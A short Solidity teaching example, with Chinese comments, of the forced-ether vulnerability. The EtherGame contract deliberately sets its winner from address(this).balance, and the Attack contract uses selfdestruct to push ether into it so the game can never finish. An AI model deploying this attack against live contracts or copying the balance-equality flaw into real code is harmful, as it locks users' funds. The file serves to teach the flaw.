pragma solidity ^0.8.9;

contract EtherGame{

    uint public targetAmount = 7 ether;
    address public winner;

    function deposit() public payable{
        require(msg.value == 1 ether, "you can only send 1 ether");

        // Attack合约进行selfdestruct时，将自己合约内的以太币转给这个合约，
        // 导致address(this).balance的值会随时变化，无法设置winner是谁
        uint balance = address(this).balance; 

        require(balance <= targetAmount, "Game is over");

        if(balance == targetAmount) {
            winner = msg.sender;
        }
    }

    function claimReward() public {
        require(msg.sender == winner, "not winner");

        (bool sent, ) = msg.sender.call{value: address(this).balance}("");
        require(sent, "failed to send ether");
    }
}

contract Attack{

    EtherGame etherGame;

    constructor(EtherGame _etherGame){
        etherGame = EtherGame(_etherGame);
    }

    function attack() public payable{

        address payable addr = payable(address(etherGame));
        selfdestruct(addr); //将Attack合约内的以太币转给addr
    }
}